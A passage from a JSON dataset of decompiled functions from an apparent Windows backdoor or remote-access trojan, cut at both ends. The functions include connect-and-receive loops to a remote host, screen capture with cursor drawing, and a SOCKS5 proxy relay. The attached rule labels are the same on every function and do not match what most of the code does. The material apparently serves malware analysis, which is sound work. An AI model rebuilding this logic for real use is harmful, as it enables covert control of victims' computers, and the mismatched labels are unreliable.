        "decompiled_code": "\nvoid fcn.00484ec8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint var_108h;\n    uint hObject;\n    \n    uStack280 = 0x484ee3;\n    fcn.00405584();\n    uStack284 = 0;\n    uStack288 = 0x1f0fff;\n    puStack292 = 0x484ef0;\n    iVar1 = sub.kernel32.dll_OpenProcess();\n    uStack296 = 0x484f57;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    if (iVar1 == 0) {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404f70();\n    }\n    else {\n        uVar3 = 0x104;\n        puStack292 = &stack0xfffffffc;\n        iVar2 = fcn.004610d0(0x104);\n        if (iVar2 != 0) {\n            fcn.004057a0();\n            *in_FS_OFFSET = uVar3;\n            uStack296 = 0x484f5e;\n            iStack300 = iVar1;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        fcn.00404f70();\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "004854e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004854e4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x485664;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack56 = 0x48550c;\n    fcn.00485460();\n    uStack56 = 0x485511;\n    cVar1 = fcn.0046d0c0();\n    *(in_EAX + 0x48) = cVar1;\n    if (cVar1 != '\\0') {\n        uStack56 = 0x485521;\n        fcn.0046d164();\n    }\n    uStack56 = 0;\n    uStack60 = 1;\n    uStack64 = 2;\n    uStack68 = 0x48552c;\n    iVar2 = sub.wsock32.dll_socket();\n    *(in_EAX + 0x44) = iVar2;\n    if (iVar2 != -1) {\n        var_10h._0_2_ = 2;\n        uStack68 = **0x4959d8;\n        uStack72 = 0x48554c;\n        var_10h._2_2_ = sub.wsock32.dll_htons();\n        uStack72 = **0x495b34;\n        uStack76 = 0x48555d;\n        var_ch = sub.wsock32.dll_inet_addr();\n        if (var_ch == -1) {\n            uStack76 = **0x495b34;\n            uStack80 = 0x485572;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x00485649;\n            var_ch = ***(iVar2 + 0xc);\n        }\n        uStack80 = 0x10;\n        puStack84 = &fcn.004854e4::var_10h;\n        uStack88 = *(in_EAX + 0x44);\n        sub.wsock32.dll_connect();\n        uStack76 = *(in_EAX + 0x44);\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            fcn.00409d78();\n            fcn.00405864();\n            fcn.00475e38();\n            uStack76 = *(in_EAX + 0x44);\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                uStack88 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffa8;\n                *(in_EAX + 0x124) = 0;\n                while ((*(in_EAX + 0xd) == '\\0' && (*(in_EAX + 0x124) == '\\0'))) {\n                    cVar1 = fcn.00485684();\n                    if (cVar1 == '\\0') {\n                        fcn.00485714();\n                    }\n                    else {\n                        fcn.0048537c();\n                    }\n                    uStack88 = 0x1e;\n                    sub.kernel32.dll_Sleep_2();\n                }\n                *in_FS_OFFSET = uStack88;\n            }\n        }\n    }\ncode_r0x00485649:\n    *in_FS_OFFSET = uStack76;\n    uStack68 = 0x48566b;\n    uStack72 = 0x485663;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 898
    },
    "00485878": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00485878(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    int64_t iVar5;\n    int32_t iStack56;\n    int32_t iStack52;\n    uint *puStack48;\n    uint lprc;\n    uint var_1ch;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack48 = 0x48588e;\n    var_4h = in_EAX;\n    fcn.0041be60();\n    var_8h = 0;\n    do {\n        iVar2 = var_8h;\n        if (*(var_4h + 0x78 + var_8h * 0x10) != 0) {\n            puVar1 = var_4h + 0x70 + var_8h * 0x10;\n            puStack48 = 0x4858b6;\n            uVar4 = fcn.0048a8b0();\n            *puVar1 = uVar4;\n            puStack48 = 0x4858c2;\n            uVar4 = fcn.0048a8b0();\n            puVar1[1] = uVar4;\n            puStack48 = 0x4858d3;\n            uVar4 = fcn.0048a8b8();\n            puVar1[2] = uVar4;\n            puStack48 = 0x4858e4;\n            uVar4 = fcn.0048a8b8();\n            puVar1[3] = uVar4;\n            puStack48 = 0x4858f2;\n            fcn.0042995c();\n            puStack48 = 0x4858f7;\n            fcn.0042537c();\n            puStack48 = 0x485902;\n            fcn.0042995c();\n            puStack48 = 0x485907;\n            fcn.0042537c();\n            iStack52 = 0x485a46;\n            iStack56 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc8;\n            puStack48 = &stack0xfffffffc;\n            (**(**(var_4h + 0x5c) + 0x40))();\n            (**(**(var_4h + 0x5c) + 0x34))();\n            uVar4 = (**(**(var_4h + 0x5c) + 0x20))\n                              (*(var_4h + 0x100), *(var_4h + 0x70 + iVar2 * 0x10), *(var_4h + 0x74 + iVar2 * 0x10), \n                               0xcc0020);\n            uVar4 = (**(**(var_4h + 0x5c) + 0x2c))(uVar4);\n            fcn.0042995c(0, 0, uVar4);\n            uVar4 = fcn.004256c0();\n            sub.gdi32.dll_BitBlt(uVar4);\n            fcn.0042995c(0, 0, 0xcc0020);\n            uVar4 = fcn.004256c0();\n            uVar4 = (**(**(var_4h + 0x5c) + 0x20))(uVar4);\n            uVar4 = (**(**(var_4h + 0x5c) + 0x2c))(uVar4);\n            fcn.0042995c(*(var_4h + 0x70 + iVar2 * 0x10), *(var_4h + 0x74 + iVar2 * 0x10), uVar4);\n            uVar4 = fcn.004256c0();\n            sub.gdi32.dll_BitBlt();\n            fcn.0041b994();\n            (**(**(var_4h + 0x5c) + 0x58))();\n            *in_FS_OFFSET = uVar4;\n            fcn.0042995c(0x485a4d);\n            fcn.004255b4();\n            fcn.0042995c();\n            fcn.004255b4();\n            return;\n        }\n        var_8h = var_8h + 1;\n    } while (var_8h != 9);\n    puStack48 = &fcn.00485878::lpPoint;\n    iStack52 = 0x485a63;\n    sub.user32.dll_GetCursorPos();\n    iStack52 = 0x485a74;\n    cVar3 = fcn.00418450();\n    if (cVar3 != '\\0') {\n        iStack52 = 0x485a82;\n        iVar5 = (****(var_4h + 0x4c))();\n        if (iVar5 >> 0x20 == 0) {\n            if (iVar5 == 0) goto code_r0x00485c37;\n        }\n        else if (iVar5 < 0x100000000) goto code_r0x00485c37;\n    }\n    iStack52 = 0x485aa8;\n    (**(**(var_4h + 0x5c) + 0x40))();\n    iStack52 = 0x485ab8;\n    (**(**(var_4h + 0x5c) + 0x34))();\n    iStack52 = *(var_4h + 0x110) + 0x16;\n    iStack56 = *(var_4h + 0x10c) + 0x16;\n    sub.user32.dll_SetRect(&fcn.00485878::lprc, *(var_4h + 0x10c) + -10, *(var_4h + 0x110) + -10);\n    fcn.0042995c(lprc, var_1ch, 0xcc0020);\n    uVar4 = fcn.004256c0();\n    uVar4 = (**(**(var_4h + 0x5c) + 0x20))(uVar4);\n    uVar4 = (**(**(var_4h + 0x5c) + 0x2c))(uVar4);\n    fcn.0042995c(0, 0, uVar4);\n    uVar4 = fcn.004256c0();\n    sub.gdi32.dll_BitBlt(uVar4);\n    fcn.0041b994();\n    (**(**(var_4h + 0x5c) + 0x58))();\n    *(var_4h + 0x10c) = lpPoint;\n    *(var_4h + 0x110) = var_ch;\n    sub.user32.dll_SetRect\n              (&fcn.00485878::lprc, *(var_4h + 0x10c) + -10, *(var_4h + 0x110) + -10, *(var_4h + 0x10c) + 0x16, \n               *(var_4h + 0x110) + 0x16);\n    fcn.0042995c(lprc, var_1ch, 0xcc0020);\n    uVar4 = fcn.004256c0();\n    uVar4 = (**(**(var_4h + 0x5c) + 0x20))(uVar4);\n    uVar4 = (**(**(var_4h + 0x5c) + 0x2c))(uVar4);\n    fcn.0042995c(0, 0, uVar4);\n    uVar4 = fcn.004256c0();\n    sub.gdi32.dll_BitBlt(uVar4);\n    fcn.0042995c(0, 0, *(var_4h + 0x108));\n    uVar4 = fcn.004256c0();\n    sub.user32.dll_DrawIcon(uVar4);\n    fcn.0041b994();\n    (**(**(var_4h + 0x5c) + 0x58))();\ncode_r0x00485c37:\n    iStack52 = 0x485c41;\n    iVar5 = (****(var_4h + 0x4c))();\n    if (iVar5 >> 0x20 == 0) {\n        if (iVar5 == 0) {\n            return;\n        }\n    }\n    else if (iVar5 < 0x100000000) {\n        return;\n    }\n    iStack52 = 0x485c5c;\n    fcn.00485ed0();\n    return;\n}\n",
        "token_count": 1956
    },
    "00485c64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00485c64(uint param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar auStack68 [16];\n    int32_t aiStack52 [9];\n    \n    iVar11 = *param_2;\n    iVar9 = param_2[1];\n    iVar2 = param_2[2];\n    iVar3 = param_2[3];\n    iVar10 = 0;\n    while ((((*(in_EAX + 0x78 + iVar10 * 0x10) == 0 || (0x20 < *(in_EAX + 0x70 + iVar10 * 0x10) - iVar2)) ||\n            (0x20 < iVar11 - *(in_EAX + 0x78 + iVar10 * 0x10))) ||\n           ((0x26 < *(in_EAX + 0x74 + iVar10 * 0x10) - iVar3 || (0x26 < iVar9 - *(in_EAX + 0x7c + iVar10 * 0x10)))))) {\n        iVar10 = iVar10 + 1;\n        if (iVar10 == 9) {\n            iVar10 = 0;\n            piVar12 = aiStack52;\n            do {\n                if (*(in_EAX + 0x78 + iVar10 * 0x10) != 0) {\n                    iVar5 = fcn.0048a8b0();\n                    iVar6 = fcn.0048a8b0();\n                    iVar7 = fcn.0048a8b8();\n                    iVar8 = fcn.0048a8b8();\n                    puVar13 = auStack68;\n                    sub.user32.dll_SetRect();\n                    iVar5 = ((((iVar9 - iVar5) * (iVar2 - iVar11) -\n                              (*(in_EAX + 0x78 + iVar10 * 0x10) - *(in_EAX + 0x70 + iVar10 * 0x10)) *\n                              (*(in_EAX + 0x7c + iVar10 * 0x10) - *(in_EAX + 0x74 + iVar10 * 0x10))) -\n                             (iVar7 - puVar13) * (iVar6 - iVar8)) * 4) / *(in_EAX + 0x6c);\n                    if (iVar5 < 8000) {\n                        puVar1 = in_EAX + 0x70 + iVar10 * 0x10;\n                        *puVar1 = puVar13;\n                        puVar1[1] = iVar8;\n                        puVar1[2] = iVar7;\n                        puVar1[3] = iVar6;\n                        return;\n                    }\n                    *piVar12 = iVar5;\n                }\n                iVar10 = iVar10 + 1;\n                piVar12 = piVar12 + 1;\n            } while (iVar10 != 9);\n            iVar10 = 0;\n            do {\n                if (*(in_EAX + 0x78 + iVar10 * 0x10) == 0) {\n                    piVar12 = in_EAX + 0x70 + iVar10 * 0x10;\n                    *piVar12 = iVar11;\n                    piVar12[1] = iVar9;\n                    piVar12[2] = iVar2;\n                    piVar12[3] = iVar3;\n                    return;\n                }\n                iVar10 = iVar10 + 1;\n            } while (iVar10 != 9);\n            iVar11 = 0;\n            iVar9 = 1;\n            piVar12 = aiStack52;\n            do {\n                piVar12 = piVar12 + 1;\n                if (*piVar12 < aiStack52[iVar11]) {\n                    iVar11 = iVar9;\n                }\n                iVar9 = iVar9 + 1;\n            } while (iVar9 != 9);\n            uVar4 = fcn.0048a8b0();\n            uVar4 = fcn.0048a8b0(uVar4);\n            uVar4 = fcn.0048a8b8(uVar4);\n            uVar4 = fcn.0048a8b8(uVar4);\n            sub.user32.dll_SetRect(in_EAX + 0x70 + iVar11 * 0x10, uVar4);\n            return;\n        }\n    }\n    uVar4 = fcn.0048a8b0();\n    uVar4 = fcn.0048a8b0(uVar4);\n    uVar4 = fcn.0048a8b8(uVar4);\n    uVar4 = fcn.0048a8b8(uVar4);\n    sub.user32.dll_SetRect(in_EAX + 0x70 + iVar10 * 0x10, uVar4);\n    return;\n}\n",
        "token_count": 1131
    },
    "004866ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004866ec(void)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x486768;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    puVar2 = &stack0xfffffffc;\n    if (*(in_EAX + 0x40) != 0) {\n        fcn.0040f94c();\n        puVar2 = puStack20;\n    }\n    puStack20 = puVar2;\n    if (*(*0x49d3a0 + 0xec) != '\\0') {\n        fcn.004666ac();\n    }\n    fcn.00466b64();\n    fcn.0040f94c();\n    fcn.0040f94c();\n    sub.wsock32.dll_shutdown(*0x49f3a8, 2);\n    uVar1 = *0x49f3a8;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 277
    },
    "004868d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004868d4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_2eh;\n    uint16_t var_10h;\n    int32_t var_eh;\n    int32_t var_ah;\n    int16_t var_6h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x486a3e;\n    puStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack76;\n    fcn.004866ec();\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x40) = uVar2;\n    cVar1 = fcn.00486780();\n    if (cVar1 != '\\0') {\n        var_eh = *(in_EAX + 0x44);\n        var_10h = *(in_EAX + 0x48);\n        var_4h._0_2_ = *(in_EAX + 0x4c);\n        var_ah = var_10h * var_eh * 2;\n        var_6h = var_10h * 2;\n        if (*0x49d3a0 == 0) {\n            *0x49d3a0 = fcn.00466458();\n        }\n        if (*0x49d3a4 == 0) {\n            *0x49d3a4 = fcn.004668ec();\n        }\n        iVar3 = *0x49d3a4;\n        *(*0x49d3a4 + 0xa4) = *(in_EAX + 0x40);\n        *(iVar3 + 0xa0) = fcn.00486a50;\n        *(*0x49d3a0 + 0x15e) = var_10h;\n        *(*0x49d3a0 + 0x160) = var_eh;\n        *(*0x49d3a0 + 0x164) = var_ah;\n        *(*0x49d3a0 + 0x168) = var_6h;\n        *(*0x49d3a0 + 0x16a) = var_4h;\n        fcn.004666c8();\n        fcn.00466bbc();\n        fcn.004666ac();\n        fcn.00466a84();\n        while (*(in_EAX + 0xd) == '\\0') {\n            while( true ) {\n                puStack76 = &var_2eh;\n                iVar3 = sub.user32.dll_PeekMessageA();\n                if (iVar3 == 0) break;\n                sub.user32.dll_TranslateMessage(&var_2eh);\n                puStack76 = &var_2eh;\n                sub.user32.dll_DispatchMessageA();\n            }\n        }\n    }\n    fcn.004866ec();\n    *in_FS_OFFSET = puStack76;\n    return;\n}\n",
        "token_count": 701
    },
    "00486c90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00486c90(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < param_2) {\n        do {\n            if (*(in_EAX + 0xd) != '\\0') {\n                return;\n            }\n            sub.kernel32.dll_Sleep_1();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00486d68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00486d68(void)\n\n{\n    char cVar1;\n    \n    **0x495a78 = 0;\n    **0x495a88 = 0;\n    fcn.00487ecc();\n    if (**0x4958f4 != 0) {\n        cVar1 = fcn.0048a188();\n        if (cVar1 != '\\0') {\n            fcn.0041fec4();\n        }\n    }\n    if (**0x495908 != 0) {\n        cVar1 = fcn.00488cec();\n        if (cVar1 != '\\0') {\n            fcn.0041fec4();\n        }\n    }\n    if ((**0x495bf8 != 0) && (**0x495c58 != 0)) {\n        (***0x495ca4)();\n    }\n    **0x4959fc = 0;\n    sub.wsock32.dll_shutdown(**0x495af4, 2);\n    sub.wsock32.dll_closesocket(**0x495af4);\n    **0x495af4 = 0;\n    fcn.00486e20();\n    return;\n}\n",
        "token_count": 252
    },
    "00487158": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00487158(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uVar4;\n    uint uStack5840;\n    uint uStack5836;\n    uchar *puStack5832;\n    uint var_16b4h;\n    uint *var_16b0h;\n    int32_t iStack5808;\n    uint uStack5804;\n    uint var_16a4h;\n    uint *puStack5796;\n    uint uStack5792;\n    uint uStack5788;\n    uint var_15a0h;\n    uint var_159ch;\n    uint var_158eh;\n    uint var_58eh;\n    uint var_399h;\n    uint var_140h;\n    uint8_t var_13ch;\n    uint var_138h;\n    uint var_132h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack5832 = 0x487184;\n    fcn.00405fe8();\n    uStack5836 = 0x487656;\n    uStack5840 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe930;\n    puStack5832 = &stack0xfffffffc;\n    fcn.00408568();\n    iVar2 = sub.wsock32.dll_recv(var_10h, &fcn.00487158::var_132h, 2, 2);\n    if (((iVar2 < 1) || (var_132h != '\\x05')) ||\n       (sub.wsock32.dll_recv(var_10h, &fcn.00487158::var_132h, var_132h._1_1_ + 2, 0),  var_132h._1_1_ - 1 < 0))\n    goto code_r0x00487621;\n    var_24h = 0;\n    if (var_132h._2_1_ == '\\x02') {\n        if ((var_18h == 0) && (var_14h == 0)) {\n            var_132h._1_1_ = 0;\n            sub.wsock32.dll_send(var_10h, &fcn.00487158::var_132h, 2, 0);\n        }\n        else {\n            var_132h._1_1_ = 2;\n            sub.wsock32.dll_send(var_10h, &fcn.00487158::var_132h, 2, 0);\n            sub.wsock32.dll_recv(var_10h, &fcn.00487158::var_399h, 0x259, 0);\n            if (var_399h == '\\x01') {\n                fcn.00405620();\n                uVar3 = var_399h._1_1_ == 0xfffffffe;\n                fcn.00405620();\n                fcn.00405974();\n                if ((!uVar3) || (fcn.00405974(),  !uVar3)) {\n                    var_399h._1_1_ = 0xff;\n                    sub.wsock32.dll_send(var_10h, &fcn.00487158::var_399h, 2, 0);\n                    goto code_r0x00487621;\n                }\n                var_399h._1_1_ = 0;\n                sub.wsock32.dll_send(var_10h, &fcn.00487158::var_399h, 2, 0);\n            }\n        }\n    }\n    else if (var_132h._2_1_ == '\\0') {\n        if ((var_14h != 0) || (var_18h != 0)) {\n            var_132h._1_1_ = 0xff;\n            sub.wsock32.dll_send(var_10h, &fcn.00487158::var_132h, 2, 0);\n            goto code_r0x00487621;\n        }\n        var_132h._1_1_ = 0;\n        sub.wsock32.dll_send(var_10h, &fcn.00487158::var_132h, 2, 0);\n    }\n    else if (var_132h._1_1_ == 0) {\n        var_132h._1_1_ = 0xff;\n        sub.wsock32.dll_send(var_10h, &fcn.00487158::var_132h, 2, 0);\n        goto code_r0x00487621;\n    }\n    uStack5788 = 2;\n    uStack5792 = 0xc;\n    puStack5796 = &fcn.00487158::var_140h;\n    uStack5804 = 0x487386;\n    sub.wsock32.dll_recv();\n    if (var_140h._1_1_ == '\\x01') {\n        uStack5804 = 0x4873a5;\n        fcn.00403af4();\n        if (var_140h._3_1_ == '\\x01') {\n            uStack5804 = 0;\n            iStack5808 = 0xc;\n            var_16b0h = &fcn.00487158::var_140h;\n            sub.wsock32.dll_recv();\n            var_15a0h._2_2_ = var_138h;\n            fcn.00408568();\n        }\n        else if (var_140h._3_1_ == '\\x03') {\n            uStack5804 = 0x487404;\n            fcn.00403af4();\n            uStack5804 = 0;\n            iStack5808 = var_13ch + 7;\n            var_16b0h = &fcn.00487158::var_58eh;\n            var_16b4h = var_10h;\n            sub.wsock32.dll_recv();\n            fcn.00405620();\n            fcn.004059dc();\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            var_159ch = ***(iVar2 + 0xc);\n            var_15a0h._2_2_ = sub.wsock32.dll_htons();\n        }\n        var_15a0h._0_2_ = 2;\n        puStack5832 = 0x1;\n        uStack5836 = 2;\n        uStack5840 = 0x487489;\n        unaff_ESI = sub.wsock32.dll_socket();\n        uStack5840 = 0x10;\n        iVar2 = sub.wsock32.dll_connect(unaff_ESI, &fcn.00487158::var_15a0h);\n        var_140h._1_1_ = iVar2 != 0;\n        var_140h._0_1_ = 5;\n        var_140h._2_1_ = 0;\n        var_140h._3_1_ = '\\x01';\n        fcn.00403af4();\n        var_30h = 0x10;\n        sub.wsock32.dll_getsockname(unaff_ESI, &fcn.00487158::var_16b4h, &fcn.00487158::var_30h);\n        fcn.00408568();\n        var_138h._0_2_ = var_16b4h._2_2_;\n        sub.wsock32.dll_send(var_10h, &fcn.00487158::var_140h, 10, 0);\n        var_2ch = 5;\n        do {\n            fcn.00408740();\n            fcn.00408730();\n            fcn.00408730();\n            uVar4 = 0;\n            iVar2 = sub.wsock32.dll_select();\n            if (iVar2 != -1) {\n                cVar1 = fcn.00408718();\n                if (cVar1 != '\\0') {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv();\n                    if (iVar2 == -1) break;\n                    uVar4 = var_10h;\n                    sub.wsock32.dll_send();\n                }\n                cVar1 = fcn.00408718(uVar4);\n                if (cVar1 != '\\0') {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv(var_10h, &fcn.00487158::var_158eh, 0x1000, 0);\n                    if (iVar2 == -1) break;\n                    sub.wsock32.dll_send(unaff_ESI, &fcn.00487158::var_158eh, iVar2, 0);\n                }\n            }\n            sub.kernel32.dll_Sleep_2(0x96);\n        } while( true );\n    }\ncode_r0x00487621:\n    sub.wsock32.dll_closesocket(var_10h);\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = unaff_ESI;\n    fcn.004060ac(0x48765d);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2085
    },
    "00488394": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00488394(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t *in_FS_OFFSET;\n    ushort uStackY8228;\n    ushort uStackY8226;\n    int32_t iStackY8224;\n    uchar auStackY8212 [3976];\n    uint uStackY4236;\n    uchar *puStackY4228;\n    uint uStackY4224;\n    uint uStackY4220;\n    uchar *puStackY4216;\n    uchar *puStackY4212;\n    uint uStackY4208;\n    uchar *puStackY4204;\n    uchar *puStackY4200;\n    uchar *puStackY4196;\n    uint uStackY4192;\n    int32_t iStack4160;\n    uint uStack4156;\n    uchar *puStack4152;\n    int32_t var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4152 = &stack0xfffffffc;\n    iVar3 = 2;\n    do {\n        iVar1 = iVar3;\n        iVar3 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack4156 = 0x4885fd;\n    iStack4160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefc0;\n    sub.ole32.dll_CoInitialize();\n    puVar2 = sub.wsock32.dll_socket();\n    if (puVar2 != 0xffffffff) {\n        uStackY8228 = 2;\n        uStackY8226 = sub.wsock32.dll_htons();\n        iStackY8224 = sub.wsock32.dll_inet_addr();\n        if (iStackY8224 == -1) {\n            uStackY4192 = 0x48842e;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            if (iVar3 == 0) goto code_r0x004885ad;\n            iStackY8224 = ***(iVar3 + 0xc);\n        }\n        uStackY4192 = 0x10;\n        puStackY4196 = &stack0xffffdfdc;\n        puStackY4204 = 0x488452;\n        puStackY4200 = puVar2;\n        sub.wsock32.dll_connect();\n        puStackY4204 = NULL;\n        uStackY4208 = 1;\n        puStackY4212 = &stack0xffffdfec;\n        uStackY4220 = 0x488463;\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uStackY4220 = 0x48847b;\n            fcn.00409d78();\n            uStackY4220 = 0x488491;\n            fcn.00405864();\n            uStackY4220 = 0x48849e;\n            fcn.00475e38();\n            uStackY4220 = 0;\n            uStackY4224 = 1;\n            puStackY4228 = &stack0xffffdfec;\n            uStackY4236 = 0x4884af;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                uStackY4236 = 0x4884c2;\n                var_10h = fcn.00464d68();\n                uStackY4236 = 0x4884d3;\n                fcn.00464df8();\n                uStackY4236 = 0x4884df;\n                var_ch = fcn.00404620();\n                while (*(iVar1 + 0xd) == '\\0') {\n                    uStackY4192 = 0;\n                    puStackY4196 = 0x2000;\n                    puStackY4200 = &stack0xffffdfec;\n                    uStackY4208 = 0x4884fb;\n                    iVar3 = sub.wsock32.dll_recv();\n                    if (iVar3 < 1) {\n                        uStackY4208 = 0x48850e;\n                        fcn.00475d98();\n                        break;\n                    }\n                    uStackY4208 = 0x488524;\n                    fcn.00464e84();\n                    uStackY4208 = 0;\n                    puStackY4216 = 0x488530;\n                    fcn.0041b750(0, 0);\n                    do {\n                        uStackY4192 = 0x488542;\n                        fcn.00403af4();\n                        uStackY4192 = 0x488555;\n                        puVar4 = (**(*var_ch + 0xc))();\n                        if (puVar4 == NULL) break;\n                        uStackY4192 = 0;\n                        puStackY4200 = &stack0xffffdfec;\n                        uStackY4208 = 0x48856b;\n                        puStackY4204 = puVar2;\n                        puStackY4196 = puVar4;\n                        sub.wsock32.dll_send();\n                        uStackY4208 = 0;\n                        puStackY4212 = 0x2000;\n                        puStackY4216 = &stack0xffffdfec;\n                        uStackY4224 = 0x48857f;\n                        